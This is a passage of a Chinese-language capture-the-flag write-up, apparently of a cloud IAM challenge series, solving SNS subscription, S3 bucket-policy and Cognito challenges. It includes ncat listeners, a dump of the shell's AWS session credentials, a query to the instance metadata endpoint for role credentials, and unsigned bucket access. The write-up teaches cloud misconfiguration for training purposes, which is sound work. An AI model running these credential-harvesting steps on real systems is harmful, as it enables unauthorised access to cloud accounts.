  <span class="s">"Message"</span> <span class="o">:</span> <span class="s">"You have chosen to subscribe to the topic arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications.\nTo confirm the subscription, visit the SubscribeURL included in this message."</span><span class="o">,</span>
  <span class="s">"SubscribeURL"</span> <span class="o">:</span> <span class="s">"https://sns.us-east-1.amazonaws.com/?Action=ConfirmSubscription&amp;TopicArn=arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications&amp;Token=2336412f37fb687f5d51e6e2425ba1f30ada01309a96da3c7072d512501b25ede6e690169cfa386bcbaaff265d4c3f0d047153f295e97cc4020e420f36ae2553aac73fd2baef6c051670ce02ab10fb09f7db661b1ef915af87b781a8de16db691509852a3460ff3227bbc1ad2ff749cb3d58fb1166824006220132dc88fdceb2"</span><span class="o">,</span>
  <span class="s">"Timestamp"</span> <span class="o">:</span> <span class="s">"2024-10-10T10:13:09.997Z"</span><span class="o">,</span>
  <span class="s">"SignatureVersion"</span> <span class="o">:</span> <span class="s">"1"</span><span class="o">,</span>
  <span class="s">"Signature"</span> <span class="o">:</span> <span class="s">"GsDM0wHuGVwkFjCUudVqjMohtQhYhDfFzUfkniXcK0150Y3K7xbxY//C3hjQLBklPLh7mEmsXVhBC0AmJpfsqng5kntxXLBCn+dm0yILKIMTK0147ufIifvGkBhLBpOxE2YM4bzdfG0L+/35Fg3jwUJMBrFmw3v5QLQLkLM0W0HQYKuDsmMcyHFvrBJerHDImCLewflhFE/15pfz4ApEQCC1TikaJ2LnjfzTFKoKA1o4nNsulDefWD64CKDXmNQN9Es0hBTC4Ygw5J+Y6jqEdvymhRJaj4MY0oplDvE0CXHfXet5tmAFHA90ArWlFTzJ7LabztEWtRK9OckS+/yX9w=="</span><span class="o">,</span>
  <span class="s">"SigningCertURL"</span> <span class="o">:</span> <span class="s">"https://sns.us-east-1.amazonaws.com/SimpleNotificationService-60eadc530605d63b8e62a523676ef735.pem"</span>
<span class="o">}</span><span class="n">NCAT</span> <span class="n">DEBUG</span><span class="o">:</span> <span class="n">Closing</span> <span class="n">fd</span> <span class="mf">5.</span>
</pre></div>
<p>发现了</p>
<p><strong>SubscribeURL</strong>:</p>
<ul>
<li><code>"SubscribeURL": "<a href="https://sns.us-east-1.amazonaws.com/?Action=ConfirmSubscription&amp;TopicArn=arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications&amp;Token=2336412f37fb687f5d51e6e2425ba1f30ada01309a96da3c7072d512501b25ede6e690169cfa386bcbaaff265d4c3f0d047153f295e97cc4020e420f36ae2553aac73fd2baef6c051670ce02ab10fb09f7db661b1ef915af87b781a8de16db691509852a3460ff3227bbc1ad2ff749cb3d58fb1166824006220132dc88fdceb2" target="_blank">sns.us-east-1.amazonaws.com/?Action=ConfirmSubscription&amp;TopicArn=arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications&amp;Token=2336412f37fb687f5d51e6e2425ba1f30ada01309a96da3c7072d512501b25ede6e690169cfa386bcbaaff265d4c3f0d047153f295e97cc4020e420f36ae2553aac73fd2baef6c051670ce02ab10fb09f7db661b1ef915af87b781a8de16db691509852a3460ff3227bbc1ad2ff749cb3d58fb1166824006220132dc88fdceb2</a>"</code></li>
<li>这个 URL 是确认订阅的链接。当你访问这个链接时，SNS 会确认你对主题的订阅。</li>
</ul>
<p>然后我再次监听，然后访问这个网址</p>
<div class="highlight"><pre><span></span><span class="n">root</span><span class="nd">@VM</span><span class="o">-</span><span class="mi">16</span><span class="o">-</span><span class="mi">17</span><span class="o">-</span><span class="n">ubuntu</span><span class="o">:~</span><span class="err">#</span> <span class="n">ncat</span> <span class="o">-</span><span class="n">lvvp</span> <span class="mi">2334</span>
<span class="nl">Ncat:</span> <span class="n">Version</span> <span class="mf">7.80</span> <span class="o">(</span> <span class="n">https</span><span class="o">:</span><span class="c1">//nmap.org/ncat )</span>
<span class="nl">Ncat:</span> <span class="n">Listening</span> <span class="n">on</span> <span class="o">:::</span><span class="mi">2334</span>
<span class="nl">Ncat:</span> <span class="n">Listening</span> <span class="n">on</span> <span class="mf">0.0.0.0</span><span class="o">:</span><span class="mi">2334</span>
<span class="nl">Ncat:</span> <span class="n">Connection</span> <span class="n">from</span> <span class="mf">15.221.161.103</span><span class="o">.</span>
<span class="nl">Ncat:</span> <span class="n">Connection</span> <span class="n">from</span> <span class="mf">15.221.161.103</span><span class="o">:</span><span class="mf">63774.</span>
<span class="n">POST</span> <span class="o">/</span><span class="nd">@tbic.wiz.io</span> <span class="n">HTTP</span><span class="o">/</span><span class="mf">1.1</span>
<span class="n">x</span><span class="o">-</span><span class="n">amz</span><span class="o">-</span><span class="n">sns</span><span class="o">-</span><span class="n">message</span><span class="o">-</span><span class="n">type</span><span class="o">:</span> <span class="n">Notification</span>
<span class="n">x</span><span class="o">-</span><span class="n">amz</span><span class="o">-</span><span class="n">sns</span><span class="o">-</span><span class="n">message</span><span class="o">-</span><span class="n">id</span><span class="o">:</span> <span class="n">eca98c2d</span><span class="o">-</span><span class="mi">3</span><span class="n">af5</span><span class="o">-</span><span class="mi">5080</span><span class="o">-</span><span class="mi">9</span><span class="n">b7d</span><span class="o">-</span><span class="n">d3ac962145db</span>
<span class="n">x</span><span class="o">-</span><span class="n">amz</span><span class="o">-</span><span class="n">sns</span><span class="o">-</span><span class="n">topic</span><span class="o">-</span><span class="n">arn</span><span class="o">:</span> <span class="n">arn</span><span class="o">:</span><span class="n">aws</span><span class="o">:</span><span class="n">sns</span><span class="o">:</span><span class="n">us</span><span class="o">-</span><span class="n">east</span><span class="o">-</span><span class="mi">1</span><span class="o">:</span><span class="mi">092297851374</span><span class="o">:</span><span class="n">TBICWizPushNotifications</span>
<span class="n">x</span><span class="o">-</span><span class="n">amz</span><span class="o">-</span><span class="n">sns</span><span class="o">-</span><span class="n">subscription</span><span class="o">-</span><span class="n">arn</span><span class="o">:</span> <span class="n">arn</span><span class="o">:</span><span class="n">aws</span><span class="o">:</span><span class="n">sns</span><span class="o">:</span><span class="n">us</span><span class="o">-</span><span class="n">east</span><span class="o">-</span><span class="mi">1</span><span class="o">:</span><span class="mi">092297851374</span><span class="o">:</span><span class="n">TBICWizPushNotifications</span><span class="o">:</span><span class="n">da3274e9</span><span class="o">-</span><span class="n">cd03</span><span class="o">-</span><span class="mi">445</span><span class="n">e</span><span class="o">-</span><span class="n">ae56</span><span class="o">-</span><span class="mi">2</span><span class="n">c2f4e131110</span>
<span class="n">Content</span><span class="o">-</span><span class="n">Type</span><span class="o">:</span> <span class="n">text</span><span class="o">/</span><span class="n">plain</span><span class="o">;</span> <span class="n">charset</span><span class="o">=</span><span class="n">UTF</span><span class="o">-</span><span class="mi">8</span>
<span class="n">X</span><span class="o">-</span><span class="n">Amzn</span><span class="o">-</span><span class="n">Trace</span><span class="o">-</span><span class="n">Id</span><span class="o">:</span> <span class="n">Root</span><span class="o">=</span><span class="mi">1</span><span class="o">-</span><span class="mi">6707</span><span class="n">aa94</span><span class="o">-</span><span class="mi">22</span><span class="n">c214a077968d552a199253</span><span class="o">;</span><span class="n">Parent</span><span class="o">=</span><span class="mi">21455</span><span class="n">a4cf2a4b790</span><span class="o">;</span><span class="n">Sampled</span><span class="o">=</span><span class="mi">0</span><span class="o">;</span><span class="n">Lineage</span><span class="o">=</span><span class="mi">1</span><span class="o">:</span><span class="mi">36680206</span><span class="o">:</span><span class="mi">0</span>
<span class="n">Content</span><span class="o">-</span><span class="n">Length</span><span class="o">:</span> <span class="mi">963</span>
<span class="nl">Host:</span> <span class="mf">49.232.222.195</span><span class="o">:</span><span class="mi">2334</span>
<span class="nl">Connection:</span> <span class="n">Keep</span><span class="o">-</span><span class="n">Alive</span>
<span class="n">User</span><span class="o">-</span><span class="n">Agent</span><span class="o">:</span> <span class="n">Amazon</span> <span class="n">Simple</span> <span class="n">Notification</span> <span class="n">Service</span> <span class="n">Agent</span>
<span class="n">Accept</span><span class="o">-</span><span class="n">Encoding</span><span class="o">:</span> <span class="n">gzip</span><span class="o">,</span><span class="n">deflate</span>

<span class="o">{</span>
  <span class="s">"Type"</span> <span class="o">:</span> <span class="s">"Notification"</span><span class="o">,</span>
  <span class="s">"MessageId"</span> <span class="o">:</span> <span class="s">"eca98c2d-3af5-5080-9b7d-d3ac962145db"</span><span class="o">,</span>
  <span class="s">"TopicArn"</span> <span class="o">:</span> <span class="s">"arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications"</span><span class="o">,</span>
  <span class="s">"Message"</span> <span class="o">:</span> <span class="s">"{wiz:always-suspect-asterisks}"</span><span class="o">,</span>
  <span class="s">"Timestamp"</span> <span class="o">:</span> <span class="s">"2024-10-10T10:21:08.321Z"</span><span class="o">,</span>
  <span class="s">"SignatureVersion"</span> <span class="o">:</span> <span class="s">"1"</span><span class="o">,</span>
  <span class="s">"Signature"</span> <span class="o">:</span> <span class="s">"Gc8b1XQrgIm1UixiRmPN5JsnubQgqWy4PQFHsvSIIyB56uGTAN3drvrbTEce9kuJ8SIiE8Epf5d93rllFDrnGjNO7pDqDSDqrRunDOAZsfk30lJifUZ7hUfD2nf16Z/kaIfKQQehGXI5CCAnuriZV64pnwVq5i6IZTT49tNvtoJ4S7BcxnHjFPUawpVi9J6LJH2T2VKUBcGGTGyCVNzefuPaBv4KxtACaBvtc1RIXiUzkwg/885Q7O+Zgjdebxan4Jhc2RIA4DTd1awwdYUhmpY9mX0vcfkN6WkdxIvKwkvDkpdEvHexkWNkE2wxbXCnzrcU2o2qLvSeM9CoH85emA=="</span><span class="o">,</span>
  <span class="s">"SigningCertURL"</span> <span class="o">:</span> <span class="s">"https://sns.us-east-1.amazonaws.com/SimpleNotificationService-60eadc530605d63b8e62a523676ef735.pem"</span><span class="o">,</span>
  <span class="s">"UnsubscribeURL"</span> <span class="o">:</span> <span class="s">"https://sns.us-east-1.amazonaws.com/?Action=Unsubscribe&amp;SubscriptionArn=arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications:da3274e9-cd03-445e-ae56-2c2f4e131110"</span>
<span class="o">}</span><span class="n">NCAT</span> <span class="n">DEBUG</span><span class="o">:</span> <span class="n">Closing</span> <span class="n">fd</span> <span class="mf">5.</span>
</pre></div>
<p>得到了flag</p>
<div class="highlight"><pre><span></span><span class="o">{</span><span class="n">wiz</span><span class="o">:</span><span class="n">always</span><span class="o">-</span><span class="n">suspect</span><span class="o">-</span><span class="n">asterisks</span><span class="o">}</span>
</pre></div>
<p>如果主题包含敏感信息或重要通知，可能会导致信息泄露的风险。</p>
<h3 data-content="1" id="4f64f0629a7e8c33f49d90ae0555451c">Admin only?</h3>
<p>描述</p>
<p>We learned from our mistakes from the past. Now our bucket only allows access to one specific admin user. Or does it?</p>
<p>我们从过去的错误中吸取了教训。现在，我们的水桶只允许一个特定的管理员用户访问。还是这样？</p>
<p>就是储存桶加权限了</p>
<p>配置如下</p>
<div class="highlight"><pre><span></span><span class="o">{</span>
    <span class="s">"Version"</span><span class="o">:</span> <span class="s">"2012-10-17"</span><span class="o">,</span>
    <span class="s">"Statement"</span><span class="o">:</span> <span class="o">[</span>
        <span class="o">{</span>
            <span class="s">"Effect"</span><span class="o">:</span> <span class="s">"Allow"</span><span class="o">,</span>
            <span class="s">"Principal"</span><span class="o">:</span> <span class="s">"*"</span><span class="o">,</span>
            <span class="s">"Action"</span><span class="o">:</span> <span class="s">"s3:GetObject"</span><span class="o">,</span>
            <span class="s">"Resource"</span><span class="o">:</span> <span class="s">"arn:aws:s3:::thebigiamchallenge-admin-storage-abf1321/*"</span>
        <span class="o">},</span>
        <span class="o">{</span>
            <span class="s">"Effect"</span><span class="o">:</span> <span class="s">"Allow"</span><span class="o">,</span>
            <span class="s">"Principal"</span><span class="o">:</span> <span class="s">"*"</span><span class="o">,</span>
            <span class="s">"Action"</span><span class="o">:</span> <span class="s">"s3:ListBucket"</span><span class="o">,</span>
            <span class="s">"Resource"</span><span class="o">:</span> <span class="s">"arn:aws:s3:::thebigiamchallenge-admin-storage-abf1321"</span><span class="o">,</span>
            <span class="s">"Condition"</span><span class="o">:</span> <span class="o">{</span>
                <span class="s">"StringLike"</span><span class="o">:</span> <span class="o">{</span>
                    <span class="s">"s3:prefix"</span><span class="o">:</span> <span class="s">"files/*"</span>
                <span class="o">},</span>
                <span class="s">"ForAllValues:StringLike"</span><span class="o">:</span> <span class="o">{</span>
                    <span class="s">"aws:PrincipalArn"</span><span class="o">:</span> <span class="s">"arn:aws:iam::133713371337:user/admin"</span>
                <span class="o">}</span>
            <span class="o">}</span>
        <span class="o">}</span>
    <span class="o">]</span>
<span class="o">}</span>
</pre></div>
<p>相比于第一关，我们只有"aws:PrincipalArn": "arn:aws:iam::133713371337:user/admin"</p>
<p>特定 IAM 用户能够列出这些对象，但是所有人都有读的权限</p>
<p>如果能猜到flag的名字还是可以读取的</p>
<p>尝试第一关的paylaod</p>
<div class="highlight"><pre><span></span><span class="n">aws</span> <span class="n">s3</span> <span class="n">cp</span> <span class="n">s3</span><span class="o">:</span><span class="c1">//thebigiamchallenge-admin-storage-abf1321/files/flag1.txt /tmp</span>
<span class="n">fatal</span> <span class="n">error</span><span class="o">:</span> <span class="n">An</span> <span class="n">error</span> <span class="nf">occurred</span> <span class="o">(</span><span class="mi">403</span><span class="o">)</span> <span class="n">when</span> <span class="n">calling</span> <span class="n">the</span> <span class="n">HeadObject</span> <span class="n">operation</span><span class="o">:</span> <span class="n">Forbiddenaws</span> <span class="n">s3</span> <span class="n">cp</span> <span class="n">s3</span><span class="o">:</span><span class="c1">//thebigiamchallenge-admin-storage-abf1321/files/flag1.txt /tmp</span>
</pre></div>
<p>果然已经不行了，看看能不能找到admin用户的凭据，或则伪造一下</p>
<p>首先寻找一下key和id</p>
<div class="highlight"><pre><span></span><span class="n">env</span> <span class="o">|</span> <span class="n">grep</span> <span class="o">-</span><span class="n">i</span> <span class="s">"AWS"</span>
<span class="n">AWS_LAMBDA_FUNCTION_VERSION</span><span class="o">=</span><span class="n">$LATEST</span>
<span class="n">AWS_SESSION_TOKEN</span><span class="o">=</span><span class="n">IQoJb3JpZ2luX2VjEBwaCXVzLWVhc3QtMSJGMEQCIHBqJOXWZRSpDokI98maU0gRJYYgN0GSSe</span>
<span class="mi">2</span><span class="n">T1dy1Wji8AiAjS58MzIsgATmWVpp3Imunf91su</span><span class="o">+</span><span class="n">g</span><span class="o">+</span><span class="n">L</span><span class="o">/</span><span class="n">eLE54TQTDYsirmAgh1EAAaDDY1NzQ4MzU4NDYxMyIMqm4Yeo</span>
<span class="n">qavxisTy1uKsMC2RuOmRfAScFk0qF17</span><span class="o">+</span><span class="n">iHqcyWQFj</span><span class="o">/</span><span class="n">W4rQqZi4hSGMINsIVs8NMMP</span><span class="o">+</span><span class="n">pjeXtKOLprhH93dV24WJbOZbXF</span>
<span class="n">fbpI9HoINrQBCL53c4VmlFEz</span><span class="c1">//J3C2rda+Bhpg7S9dct46td0PiZyVH9fSFKQPgniIqNJB5YOGrulxEjbYQYV5RLSlwy</span>
<span class="n">G4LhvBJd6VjzFu8vcQvqJPCi7XBDt5xlyN1Oc4XdwcOnvAXA8gxEp1cFvvdufrBLoOzcd</span><span class="o">++</span><span class="n">i85lQj050umUqCAOWyXx3</span>
<span class="n">pNkdDzl8LN</span><span class="c1">//AyPZQcURTfQ/b7ZmmcYnS0UN5wIhf/xs+vBhUjt3qHjAA47Vviovo+WwJvbizIb4yWkdlIFWwIpkz2OV</span>
<span class="n">c1Ldk2eeLXoZCYz4NxLCh4XZtHQoTb0udWBbHWOnaM</span><span class="o">/</span><span class="n">XdUw6bryeejCpDMPQeLzmIzm5nLYDZXD1gwrIGfuAY6nwEzI0</span>
<span class="n">MHyhC</span><span class="o">+</span><span class="n">nLp7r5E3LsyqwnEFNQZ0ARH</span><span class="o">+</span><span class="n">SKBXEAI8</span><span class="o">/</span><span class="mi">3</span><span class="n">wOKO7QSBPHgKrGyeC7KMu9hgqhgdu5N69o0JmWdsGgLXkTOg0uuv</span>
<span class="n">A8qQnW8O8zLyUfx3hR5lgZhOTEVVqao</span><span class="o">+</span><span class="n">bPVutAH68jyZyasaVUVNLrydyeolS5N8GOXdYh35zeararC92NW2wm88qBLU</span>
<span class="n">kQjvMUjfBm4lhVsPlLQge</span><span class="o">/</span><span class="n">MEU</span><span class="o">=</span>
<span class="n">AWS_DEFAULT_REGION</span><span class="o">=</span><span class="n">us</span><span class="o">-</span><span class="n">east</span><span class="o">-</span><span class="mi">1</span>
<span class="n">AWS_SECRET_ACCESS_KEY</span><span class="o">=</span><span class="n">Y6</span><span class="o">/</span><span class="n">bHkS6QZCwO1V1JuQuwea3qa1Si5Cb1Y1n6JYE</span>
<span class="n">AWS_REGION</span><span class="o">=</span><span class="n">us</span><span class="o">-</span><span class="n">east</span><span class="o">-</span><span class="mi">1</span>
<span class="n">AWS_ACCESS_KEY_ID</span><span class="o">=</span><span class="n">ASIAZSFITKRSWTF7KVQ5</span>
</pre></div>
<p>但是这应该是这个当前用户的，看一看权限</p>
<div class="highlight"><pre><span></span><span class="n">aws</span> <span class="n">sts</span> <span class="n">get</span><span class="o">-</span><span class="n">caller</span><span class="o">-</span><span class="n">identity</span>
<span class="o">{</span>
    <span class="s">"UserId"</span><span class="o">:</span> <span class="s">"AROAZSFITKRSYE6ELQP2Q:iam_shell"</span><span class="o">,</span>
    <span class="s">"Account"</span><span class="o">:</span> <span class="s">"657483584613"</span><span class="o">,</span>
    <span class="s">"Arn"</span><span class="o">:</span> <span class="s">"arn:aws:sts::657483584613:assumed-role/shell_basic_iam/iam_shell"</span>
<span class="o">}</span>
</pre></div>
<p>然后</p>
<div class="highlight"><pre><span></span><span class="n">aws</span> <span class="n">iam</span> <span class="n">list</span><span class="o">-</span><span class="n">attached</span><span class="o">-</span><span class="n">role</span><span class="o">-</span><span class="n">policies</span> <span class="o">--</span><span class="n">role</span><span class="o">-</span><span class="n">name</span> <span class="n">shell_basic_iam</span>

<span class="n">An</span> <span class="n">error</span> <span class="nf">occurred</span> <span class="o">(</span><span class="n">AccessDenied</span><span class="o">)</span> <span class="n">when</span> <span class="n">calling</span> <span class="n">the</span> <span class="n">ListAttachedRolePolicies</span> <span class="n">operation</span><span class="o">:</span> <span class="n">User</span><span class="o">:</span>
<span class="nl">arn:</span><span class="n">aws</span><span class="o">:</span><span class="n">sts</span><span class="o">::</span><span class="mi">657483584613</span><span class="o">:</span><span class="n">assumed</span><span class="o">-</span><span class="n">role</span><span class="o">/</span><span class="n">shell_basic_iam</span><span class="o">/</span><span class="n">iam_shell</span> <span class="n">is</span> <span class="n">not</span> <span class="n">authorized</span> <span class="n">to</span> <span class="n">perfor</span>
<span class="nl">m:</span> <span class="n">iam</span><span class="o">:</span><span class="n">ListAttachedRolePolicies</span> <span class="n">on</span> <span class="n">resource</span><span class="o">:</span> <span class="n">role</span> <span class="n">shell_basic_iam</span> <span class="n">because</span> <span class="n">no</span> <span class="n">identity</span><span class="o">-</span><span class="n">based</span>
<span class="n">policy</span> <span class="n">allows</span> <span class="n">the</span> <span class="n">iam</span><span class="o">:</span><span class="n">ListAttachedRolePolicies</span> <span class="n">action</span>
</pre></div>
<p>可以看见权限不高，换条路</p>
<p>看看能不能找到角色凭据</p>
<div class="highlight"><pre><span></span><span class="n">curl</span> <span class="n">http</span><span class="o">:</span><span class="c1">//169.254.169.254/latest/meta-data/iam/security-credentials/</span>
  <span class="o">%</span> <span class="n">Total</span>    <span class="o">%</span> <span class="n">Received</span> <span class="o">%</span> <span class="n">Xferd</span>  <span class="n">Average</span> <span class="n">Speed</span>   <span class="n">Time</span>    <span class="n">Time</span>     <span class="n">Time</span>  <span class="n">Current</span>
                                 <span class="n">Dload</span>  <span class="n">Upload</span>   <span class="n">Total</span>   <span class="n">Spent</span>    <span class="n">Left</span>  <span class="n">Speed</span>
  <span class="mi">0</span>     <span class="mi">0</span>    <span class="mi">0</span>     <span class="mi">0</span>    <span class="mi">0</span>     <span class="mi">0</span>      <span class="mi">0</span>      <span class="mi">0</span> <span class="o">--:--:--</span> <span class="o">--:--:--</span> <span class="o">--:--:--</span>     <span class="mi">0</span><span class="n">curl</span><span class="o">:</span> <span class="o">(</span><span class="mi">7</span><span class="o">)</span> <span class="n">Fail</span>
<span class="n">ed</span> <span class="n">to</span> <span class="n">connect</span> <span class="n">to</span> <span class="mf">169.254.169.254</span> <span class="n">port</span> <span class="mi">80</span><span class="o">:</span> <span class="n">Connection</span> <span class="n">refused</span>
</pre></div>
<p>不行</p>
<p>那我们看看能不能获得临时的身份</p>
<div class="highlight"><pre><span></span><span class="n">aws</span> <span class="n">sts</span> <span class="n">assume</span><span class="o">-</span><span class="n">role</span> <span class="o">--</span><span class="n">role</span><span class="o">-</span><span class="n">arn</span> <span class="n">arn</span><span class="o">:</span><span class="n">aws</span><span class="o">:</span><span class="n">iam</span><span class="o">::</span><span class="mi">133713371337</span><span class="o">:</span><span class="n">role</span><span class="o">/</span><span class="n">admin</span> <span class="o">--</span><span class="n">role</span><span class="o">-</span><span class="n">session</span><span class="o">-</span><span class="n">name</span> <span class="n">my</span>
<span class="n">Session</span>

<span class="n">An</span> <span class="n">error</span> <span class="nf">occurred</span> <span class="o">(</span><span class="n">AccessDenied</span><span class="o">)</span> <span class="n">when</span> <span class="n">calling</span> <span class="n">the</span> <span class="n">AssumeRole</span> <span class="n">operation</span><span class="o">:</span> <span class="n">User</span><span class="o">:</span> <span class="n">arn</span><span class="o">:</span><span class="n">aws</span><span class="o">:</span><span class="n">sts</span><span class="o">::</span><span class="mi">6</span>
<span class="mi">57483584613</span><span class="o">:</span><span class="n">assumed</span><span class="o">-</span><span class="n">role</span><span class="o">/</span><span class="n">shell_basic_iam</span><span class="o">/</span><span class="n">iam_shell</span> <span class="n">is</span> <span class="n">not</span> <span class="n">authorized</span> <span class="n">to</span> <span class="n">perform</span><span class="o">:</span> <span class="n">sts</span><span class="o">:</span><span class="n">AssumeR</span>
<span class="n">ole</span> <span class="n">on</span> <span class="n">resource</span><span class="o">:</span> <span class="n">arn</span><span class="o">:</span><span class="n">aws</span><span class="o">:</span><span class="n">iam</span><span class="o">::</span><span class="mi">133713371337</span><span class="o">:</span><span class="n">role</span><span class="o">/</span><span class="n">admin</span>
</pre></div>
<p>失败了</p>
<p>最后是使用--no-sign-request</p>
<p><strong><code>--no-sign-request</code></strong>：此选项告诉 AWS CLI 不要使用身份验证凭证（IAM 凭证）来签署请求，而是直接发起未经签名的请求。这通常用于公共存储桶，允许任何人访问无需凭证的文件。</p>
<div class="highlight"><pre><span></span><span class="n">aws</span> <span class="n">s3</span> <span class="n">ls</span> <span class="n">s3</span><span class="o">:</span><span class="c1">//thebigiamchallenge-admin-storage-abf1321/files/ --no-sign-request</span>
<span class="mi">2023</span><span class="o">-</span><span class="mo">06</span><span class="o">-</span><span class="mo">07</span> <span class="mi">19</span><span class="o">:</span><span class="mi">15</span><span class="o">:</span><span class="mi">43</span>         <span class="mi">42</span> <span class="n">flag</span><span class="o">-</span><span class="n">as</span><span class="o">-</span><span class="n">admin</span><span class="o">.</span><span class="na">txt</span>
<span class="mi">2023</span><span class="o">-</span><span class="mo">06</span><span class="o">-</span><span class="mi">08</span> <span class="mi">19</span><span class="o">:</span><span class="mi">20</span><span class="o">:</span><span class="mo">01</span>      <span class="mi">81889</span> <span class="n">logo</span><span class="o">-</span><span class="n">admin</span><span class="o">.</span><span class="na">png</span>
</pre></div>
<p>确实成功了</p>
<p>然后读取文件</p>
<div class="highlight"><pre><span></span><span class="n">aws</span> <span class="n">s3</span> <span class="n">cp</span> <span class="n">s3</span><span class="o">:</span><span class="c1">//thebigiamchallenge-admin-storage-abf1321/files/flag-as-admin.txt /tmp</span>
<span class="n">Completed</span> <span class="mi">42</span> <span class="n">Bytes</span><span class="o">/</span><span class="mi">42</span> <span class="n">Bytes</span> <span class="o">(</span><span class="mi">452</span> <span class="n">Bytes</span><span class="o">/</span><span class="n">s</span><span class="o">)</span> <span class="n">with</span> <span class="mi">1</span> <span class="n">file</span><span class="o">(</span><span class="n">s</span><span class="o">)</span> <span class="n">remainingdownload</span><span class="o">:</span> <span class="n">s3</span><span class="o">:</span><span class="c1">//thebigiamch</span>
<span class="n">allenge</span><span class="o">-</span><span class="n">admin</span><span class="o">-</span><span class="n">storage</span><span class="o">-</span><span class="n">abf1321</span><span class="o">/</span><span class="n">files</span><span class="o">/</span><span class="n">flag</span><span class="o">-</span><span class="n">as</span><span class="o">-</span><span class="n">admin</span><span class="o">.</span><span class="na">txt</span> <span class="n">to</span> <span class="o">../../</span><span class="n">tmp</span><span class="o">/</span><span class="n">flag</span><span class="o">-</span><span class="n">as</span><span class="o">-</span><span class="n">admin</span><span class="o">.</span><span class="na">txt</span>
</pre></div>
<div class="highlight"><pre><span></span><span class="n">cat</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">f</span><span class="o">*</span>
<span class="o">{</span><span class="n">wiz</span><span class="o">:</span><span class="n">principal</span><span class="o">-</span><span class="n">arn</span><span class="o">-</span><span class="n">is</span><span class="o">-</span><span class="n">not</span><span class="o">-</span><span class="n">what</span><span class="o">-</span><span class="n">you</span><span class="o">-</span><span class="n">think</span><span class="o">}</span>
</pre></div>
<p>得到flag</p>
<div class="highlight"><pre><span></span><span class="o">{</span><span class="n">wiz</span><span class="o">:</span><span class="n">principal</span><span class="o">-</span><span class="n">arn</span><span class="o">-</span><span class="n">is</span><span class="o">-</span><span class="n">not</span><span class="o">-</span><span class="n">what</span><span class="o">-</span><span class="n">you</span><span class="o">-</span><span class="n">think</span><span class="o">}</span>
</pre></div>
<h3 data-content="1" id="5d123f9266e787a4253612f67ef5c5fc">Do I know you?</h3>
<p>描述</p>
<p>We configured AWS Cognito as our main identity provider. Let's hope we didn't make any mistakes.</p>
<p>我们将 AWS Cognito 配置为主要身份提供商。希望我们没有犯任何错误。</p>
<div class="highlight"><pre><span></span><span class="o">{</span>
   <span class="s">"Version"</span><span class="o">:</span> <span class="s">"2012-10-17"</span><span class="o">,</span>
   <span class="s">"Statement"</span><span class="o">:</span> <span class="o">[</span>
      <span class="o">{</span>
           <span class="s">"Sid"</span><span class="o">:</span> <span class="s">"VisualEditor0"</span><span class="o">,</span>
           <span class="s">"Effect"</span><span class="o">:</span> <span class="s">"Allow"</span><span class="o">,</span>
           <span class="s">"Action"</span><span class="o">:</span> <span class="o">[</span>
               <span class="s">"mobileanalytics:PutEvents"</span><span class="o">,</span>
               <span class="s">"cognito-sync:*"</span>
          <span class="o">],</span>
           <span class="s">"Resource"</span><span class="o">:</span> <span class="s">"*"</span>
      <span class="o">},</span>
      <span class="o">{</span>
           <span class="s">"Sid"</span><span class="o">:</span> <span class="s">"VisualEditor1"</span><span class="o">,</span>
           <span class="s">"Effect"</span><span class="o">:</span> <span class="s">"Allow"</span><span class="o">,</span>
           <span class="s">"Action"</span><span class="o">:</span> <span class="o">[</span>
               <span class="s">"s3:GetObject"</span><span class="o">,</span>
               <span class="s">"s3:ListBucket"</span>
          <span class="o">],</span>
           <span class="s">"Resource"</span><span class="o">:</span> <span class="o">[</span>
               <span class="s">"arn:aws:s3:::wiz-privatefiles"</span><span class="o">,</span>
               <span class="s">"arn:aws:s3:::wiz-privatefiles/*"</span>
          <span class="o">]</span>
      <span class="o">}</span>
  <span class="o">]</span>
<span class="o">}</span>
</pre></div>
<p>这个很明显的提示问题是出在 AWS Cognito 配置，发现了</p>
<p><a href="https://zone.huoxian.cn/d/1297-aws-cognito-aws" target="_blank">通过错误配置的 AWS Cognito 接管 AWS 帐户</a></p>
<p>不过涉及到一些基础的知识</p>
<p><strong>Cognito 的组成部分</strong></p>
<p>AWS Cognito 主要由两个关键组件组成：</p>
<ul>
<li>
<strong>身份池（Identity Pools）</strong>：<ul>
<li>身份池用于管理用户身份。它允许应用程序为用户提供 AWS 资源的访问权限。</li>
<li>身份池支持匿名用户（未登录用户）和已验证用户（通过社交登录或自定义身份验证方式登录的用户）。</li>
<li>每个身份池都有一个唯一的 ID，用于标识该身份池。</li>
</ul>
</li>
<li>
<strong>用户池（User Pools）</strong>：<ul>
<li>用户池是一个用户目录，用于管理用户的注册、登录和身份验证。</li>
<li>用户池提供内置的用户注册、登录和多因素身份验证（MFA）功能。</li>
<li>它还允许用户通过电子邮件、手机号码等方式进行身份验证。</li>
</ul>
</li>
</ul>
<p><strong>身份 ID 身份池id</strong></p>
<ul>
<li>每个用户（包括匿名用户）在身份池中都有一个唯一的身份 ID。</li>
<li>通过调用 <code>aws cognito-identity get-id</code>，可以获取到特定用户的身份 ID。</li>
</ul>
<p><strong>获取匿名用户身份 ID</strong>：</p>
<pre><code>aws cognito-identity get-id --identity-pool-id "us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b" --region us-east-1</code></pre>
<ul>
<li>返回的身份 ID 对于所有匿名用户是相同的。</li>
</ul>
<p><strong>获取已验证用户身份 ID</strong>：</p>
<ul>
<li>如果你有一个用户通过身份验证（例如，使用 Cognito 用户池或第三方身份提供商），你应该使用其身份验证凭证：</li>
</ul>
<pre><code>aws cognito-identity get-id --identity-pool-id "us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b" --logins '{"your_provider_name":"your_user_token"}' --region us-east-1</code></pre>
<ul>
<li>这时，返回的身份 ID 会是唯一的，表示该用户在身份池中的身份。</li>
</ul>
<p><strong>临时凭据</strong></p>
<p>通过身份 ID，可以调用 <code>aws cognito-identity get-credentials-for-identity</code> 来生成临时 AWS 凭据。</p>
<p>这些凭据是基于你为身份池配置的 IAM 角色生成的，允许用户访问 AWS 资源（如 S3 存储桶、DynamoDB 等）。</p>
